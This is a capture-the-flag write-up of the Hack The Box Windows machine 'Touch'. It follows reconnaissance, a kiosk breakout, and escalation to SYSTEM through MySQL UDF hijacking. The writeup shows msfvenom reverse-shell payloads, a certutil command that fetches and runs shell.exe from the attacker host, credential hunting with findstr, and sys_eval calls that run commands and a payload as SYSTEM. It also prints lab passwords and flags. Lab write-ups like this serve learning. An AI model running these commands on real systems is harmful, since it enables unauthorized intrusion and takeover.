---
title: "Writeup HTB Touch Escalada Privilegios"
category: ["HTB", "Touch", "Writeup_HTB_Touch_Escalada_Privilegios"]
---

Note title: Untitled

Privilege Escalation on Windows via MySQL (HTB "Touch")

_Step-by-step explanation, in Spanish and simple language, of a complete Hack The Box writeup: from initial reconnaissance to command execution as SYSTEM._

# 1. Reconnaissance

The first step of any controlled intrusion (pentest / CTF) is to see what services the target machine exposes. For this, a port scan with Nmap is used:

|   |
|---|
|nmap -sV -sC 10.129.71.63|

The result showed four interesting ports:

- 135 and 3389 (RDP) — Windows Remote Desktop.
- 5985 (WinRM) — Windows Remote Management.
- 8443 (HTTP) — A web called "Nexion DeviceHub - Login".

RDP and WinRM were set aside for now because, without credentials, they cannot be used yet. The focus was on the web service on port 8443.

## 1.1 Directory Enumeration

The login page did not show anything useful at first glance, so Ffuf was used, a tool that tests many paths (URLs) to see which ones actually exist on the server:

|   |
|---|
|ffuf -u http://10.129.71.63:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios.png)|

This discovered a /api path that returned a 403 error (forbidden). A 403 is actually a good sign: it means the path exists, even if it is protected. Enumeration continued under /api and a /api/status path appeared.

When visiting /api/status without needing to log in, the server returned device information, including its serial number: NX-DH-2024-B7042. This is a typical security flaw: an endpoint that should be protected but is not, and that leaks sensitive data.

![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%201.png)

# 2. Initial Access (Foothold)

## 2.1 Logging into DeviceHub

The login screen had a "forgot password" hint that said the device's default password is its own serial number. Using the serial number leaked in the previous step (NX-DH-2024-B7042), it was possible to log directly into the DeviceHub panel.

![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%202.png)

Inside the panel, a pair of credentials appeared: KioskUser / K!0sk2026#, along with controls to turn the scanner and printer on and off.

## 2.2 Access via RDP and the Airline Kiosk

With that credential, it was possible to connect via RDP (Remote Desktop). But instead of a normal Windows desktop, the screen of an airline self-check-in kiosk appeared directly, in full-screen mode.

Following the normal kiosk flow (choose language, search for the reservation with the locator KS7X2M and the last name Crawford), a document verification step (passport) was reached. When clicking "scan", an error appeared.

![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%203.png)

## ![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%204.png)

## 2.3 Forcing a Scanner Error

Remembering that the DeviceHub panel allows turning off the physical scanner, it was turned off from there. Returning to the kiosk and repeating the process, the scan failed again, but this time with a different and more revealing error message: it included a clickable link. Clicking it opened a full browser window, outside the restricted kiosk mode.

![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%205.png)

_Note: This is an example of "kiosk breakout": exploiting an application flaw (a poorly managed error message) to escape the restricted environment and reach a normal Windows browser._

## 2.4 Escaping the Kiosk

Once with a real browser open, the Ctrl+O (Open file) shortcut was used, which shows the native Windows file selector. In the filename bar, the path to the Windows command prompt was directly entered:

|                                                                                                                                                |
| ---------------------------------------------------------------------------------------------------------------------------------------------- |
| C:\Windows\System32\cmd.exe<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%206.png) |

This made the file selector download a copy of cmd.exe. Opening that downloaded file obtained an interactive command console, running as the user KIOSK-042\KioskUser.

|   |
|---|
|whoami<br><br>? kiosk-042\kioskuser<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%207.png)|

## 2.5 User Flag

The user flag (the proof that the account has been compromised) was on the desktop. Since it is a Windows console and not a Linux one, to read the contents of a file, type is used instead of cat:

|   |
|---|
|**User Flag:** a35793a700023b1b897afcd5c3bfeb0a|

# 3. Improving the Shell (Meterpreter Session)

The downloaded cmd.exe console worked, but it was uncomfortable (no copy/paste, limited). Therefore, a Meterpreter payload was prepared, which provides a much more powerful and interactive remote session.

On the attacker's machine (Kali), the malicious executable was generated and served via a local web server:

|   |
|---|
|msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.190 LPORT=4445 -f exe -o /tmp/share/shell.exe<br><br>python3 -m http.server 8000<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%208.png)|

In parallel, a "listener" was set up with Metasploit, which is the process that waits for the victim machine to connect back:

|   |
|---|
|msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.15.190; set LPORT 4445; exploit"|

Back on the victim machine, using the already obtained cmd.exe console, that payload was downloaded and executed:

|   |
|---|
|certutil -urlcache -split -f http://10.10.15.190:8000/shell.exe shell.exe<br><br>shell.exe<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%209.png)|

This opened a Meterpreter session as KIOSK-042\KioskUser: a much more comfortable and powerful connection than the previous console.

## 3.1 Session Checks

With sysinfo, it was confirmed that the operating system was Windows 11 24H2+ (build 26100).

The post/multi/recon/local_exploit_suggester module was executed, which suggests possible local exploits for privilege escalation. It suggested several UAC bypasses (the "allow this app to make changes?" prompt in Windows), but they turned out to be dead ends: those techniques only work if the user is already a local administrator, and KioskUser is not (it only belongs to the Printer Administrators and Remote Desktop Users groups).

_Note: UAC (User Account Control) is the system that asks for confirmation before executing administrative actions in Windows. "UAC bypass" are techniques to skip that prompt, but they require the user to already have administrator privileges, which was not the case here._

# 4. Locating and Reading the Application Source Code

Exploring the file system, the actual structure of the application was found:

- C:\Program Files\HTB Airways\Kiosk\ — kiosk application (Node/Express/React)
- C:\Program Files\Nexion Systems\DocReader\ — DeviceHub backend (.NET), the one listening on port 8443
- C:\Program Files\Nexion Systems\Printer\ — printer service (.NET)
- C:\MySQL\ — a locally installed MySQL 8.0 server

Reading the kiosk backend source code directly from the disk (with type), the entire billing and staff authentication logic was discovered:

- src/services/document-service.ts: performs the actual OCR recognition of the passport (with tesseract.js and sharp) and compares the data against the reservation. This explained why previous attempts to forge a passport image had not worked: the verification is done by the kiosk backend, not the DeviceHub device.
- src/routes/staff.ts: the actual staff authentication flow via a credential in QR code format (HTBAW-STAFF:< email>:< authCode>), which is validated against a MySQL table called _htb_staff.

## 4.1 Database Credentials

The file with the database connection configuration was located:

Note title: Untitled

|   |
|---|
|type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2010.png)|

This file contains a default configuration used when the file C:\ProgramData\HTB Airways\db-config.ini doesn't exist:

|   |
|---|
|host: 127.0.0.1<br><br>port: 3306<br><br>user: kiosk_app<br><br>password: K!0sk_R3pl1ca#DB<br><br>database: htb_airways|

With these credentials, it was possible to directly query the staff table:

|   |
|---|
|mysql -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2011.png)|

# 5. Privilege Escalation

## 5.1 Current Privileges

Before proceeding, it's useful to check the current user's privileges and group memberships in Windows. This establishes the starting point to understand how far we need to escalate:

|   |
|---|
|whoami /priv<br><br>whoami /groups<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2012.png)|

## 5.2 Find a Higher-Privileged MySQL Account

The kiosk_app account found earlier is low-privileged: it only allows the application to perform its queries (read and insert data). The intended technique, called "UDF hijacking" (explained in section 5.4), requires a MySQL account with the FILE privilege, which normally only the root account has.

An initial attempt to log in as root without a password failed ("Access denied, using password: NO"), so we searched for this password in configuration files, scheduled tasks, or other .ini files near the known db-config.ini:

|   |
|---|
|dir "C:\ProgramData\HTB Airways" /s /b<br><br>type "C:\ProgramData\HTB Airways\db-config.ini"<br><br>findstr /si password C:\MySQL\*.ini C:\MySQL\*.cnf<br><br>findstr /si password "C:\Program Files\MySQL\*.ini" "C:\Program Files\MySQL\*.cnf" 2>nul<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2013.png)|

We also checked MySQL's own configuration folder for a root password or my.ini file:

|   |
|---|
|dir C:\MySQL /s /b \| findstr /i "ini cnf"<br><br>type C:\MySQL\my.ini<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2014.png)|

Next, we verified the actual privileges of the kiosk_app account, specifically whether it (or any other accessible account) had the FILE privilege and write access to the internal mysql.func table:

|   |
|---|
|mysql -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -e "SHOW GRANTS FOR CURRENT_USER();"<br><br>mysql -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2015.png)|

This confirmed that kiosk_app only has privileges on the htb_airways database, with no global FILE privilege and no access to mysql.user. In other words: this account isn't suitable for the UDF hijacking attack. We needed a more privileged account.

## 5.3 Finding the Root Password

Returning to the C:\ProgramData\HTB Airways folder, there were three other unlocked files: db-sync-replica.ps1, refresh-dates.bat, and refresh-dates.sql. Since the main file (db-config.ini) was protected but these "companion files" weren't, they seemed like a good place to look for a second, more privileged credential:

|   |
|---|
|type "C:\ProgramData\HTB Airways\db-sync-replica.ps1"<br><br>type "C:\ProgramData\HTB Airways\refresh-dates.bat"<br><br>type "C:\ProgramData\HTB Airways\refresh-dates.sql"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2016.png)|

Within these files, we found the MySQL root password: HTB@irw4ys_DB!2026. With full root access, we confirmed its privileges:

|   |
|---|
|mysql -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2017.png)|

As expected, root had File_priv = Y (meaning it has the FILE privilege). With this confirmed, we could proceed with the UDF hijacking technique.

## 5.4 UDF Hijacking (User Defined Function Hijacking)

This is the core of the attack. MySQL allows creating "User Defined Functions" (UDFs) by loading a .dll file from a specific server folder called the "plugin directory". If an attacker can upload a malicious DLL to this folder and register it as a function, that function can execute operating system commands with the same permissions as MySQL itself — in Windows, typically SYSTEM, the most privileged user.

First, we checked if this plugin directory was writable using icacls (which shows file and folder permissions in Windows):

|   |
|---|
|icacls "C:\MySQL\lib\plugin"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2018.png)|

The result showed that the group NT AUTHORITY\Authenticated Users had (I)(M) permission, meaning Modify. And since KioskUser belongs to that group, the plugin directory was writable by the attacker.

Normally, to upload the file we'd use MySQL itself with the SQL command INTO OUTFILE, but this path was blocked because the secure_file_priv variable was set to NULL (preventing MySQL from writing files via SQL). As an alternative, since we already had a Meterpreter session with filesystem access, we uploaded the DLL directly, bypassing MySQL:

|   |
|---|
|ls -la /usr/share/metasploit-framework/data/exploits/mysql/<br><br>find / -iname "*mysqludf*" 2>/dev/null<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2019.png)|
|upload /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"|

With the DLL in place, we created the function in MySQL and tested its execution:

|   |
|---|
|C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"<br><br>C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2020.png)|

The result was nt authority\system. From this point onward, every time sys_eval('some_command') is executed within MySQL, that command runs on Windows as SYSTEM: the highest possible privilege level.

## 5.5 Root Flag

With this ability to execute commands as SYSTEM, we used the same function to read the root.txt file from the Administrator's desktop, an area normally inaccessible to the original user (KioskUser):

|   |
|---|
|C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"|
|**Root flag:** 91b23b71e4e73081e339e6b5fa59baa9|

# 6. Obtain an Interactive Shell as SYSTEM

Reading the flag through sys_eval already demonstrated the attack's success, but it was cumbersome to run commands one by one. To get a full interactive session as SYSTEM, we repeated the previous process but this time executed a new Meterpreter payload via sys_eval.

On Kali, we set up a new listener:

|   |
|---|
|msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.15.190; set LPORT 4444; exploit"|

And generated a new malicious executable in another terminal:

|   |
|---|
|msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.190 LPORT=4444 -f exe -o /tmp/sys_shell.exe|

We uploaded this executable to the target via the existing Meterpreter session:

|   |
|---|
|upload /tmp/sys_shell.exe "C:\\Windows\\Temp\\sys_shell.exe"|

And finally executed it as SYSTEM using sys_eval:

|   |
|---|
|C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('C:\\Windows\\Temp\\sys_shell.exe');"|

The call waited while the executable ran, and shortly after the listener received the connection: a new Meterpreter session connected as nt authority\system.

# Attack Logic Summary

From start to finish, the exploitation chain follows this logic:

Note title: Untitled

- Reconnaissance: find exposed services and an endpoint that leaks information without authentication (the serial number).
- Initial access: use that leaked information to enter the admin panel, obtain a credential, and access via RDP.
- Kiosk escape: force an application error to exit restricted mode and reach a browser and a full Windows console.
- Shell upgrade: replace a basic console with a Meterpreter session, much more powerful.
- Source code reading: find low-privilege database credentials in the code itself.
- Search for higher-privilege credentials: locate the MySQL root password in unprotected auxiliary scripts.
- MySQL privilege abuse (UDF hijacking): exploit the fact that MySQL runs as SYSTEM and the plugins folder is writable, to register a malicious function that executes system commands.
- Final result: execution of arbitrary commands as SYSTEM, the highest privilege level in Windows.